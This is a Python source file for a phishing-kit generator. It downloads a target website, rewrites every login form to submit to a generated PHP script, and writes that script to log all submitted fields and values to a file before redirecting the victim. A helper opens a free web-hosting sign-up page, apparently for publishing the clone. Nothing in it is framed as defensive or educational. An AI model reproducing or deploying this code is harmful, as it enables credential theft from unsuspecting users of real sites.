import webbrowser
from urllib.request import urlopen
from tkinter.messagebox import showerror
from bs4 import BeautifulSoup


def hostfile():
    # redirected to 000webhostapp sign up page
    return webbrowser.open("https://www.000webhost.com/free-website-sign-up")


def validate_url1 (target_url, start="https://www.", end='.com'):
    '''validates the target url'''
    if target_url == '':
        return showerror(
            title="Bad input",
            message = "Empty field is not allowed!"
        )
    if target_url.count('.') == 2 and target_url.startswith(start) and target_url.endswith(end):
        print("Input is a valid https:// address")
        return target_url
    elif target_url.startswith(start) and not target_url.endswith(end):
        target_url = target_url+end
        print(f"'{end}' has been added to {target_url}")
        return target_url
    elif target_url.endswith(end) and not target_url.startswith(start):
        target_url = start+target_url
        print(f"'{start}' has been added to {target_url}")
        return target_url


def generate_phish(link):
    '''Generate files'''
    url = validate_url1(link)

    site_name = (validate_url1(link)).split('.') #https://www.google.com =>> google

    if url == None:
        return None
    else:
        try:
            open_link = urlopen(url)
            soup = BeautifulSoup(open_link.read(), 'html5lib')
            for form in soup('form'):
                form['action'] = f"{site_name[1]}.php"
                form['method'] = 'get'

            print("connected succesfully")

            with open("new.html", 'w', encoding="utf-8") as f:
                f.write(str(soup))

            with open(f"{site_name[1]}.php", 'w') as phished:
                phished.write(r"""<?php
                header ('Location:target.com');
                $handle = fopen(".txt", "a");
                foreach($_GET as $variable => $value) {
                fwrite($handle, $variable);
                fwrite($handle, "=");
                fwrite($handle, $value);
                fwrite($handle, "\r\n");
                    }
                fwrite($handle, "\r\n");
                fclose($handle);
                exit;
                ?>""")
        except:
            print("connection lost !")
            return showerror(
                title="No internet",
                message = "please connect to the internet and try again"
            )
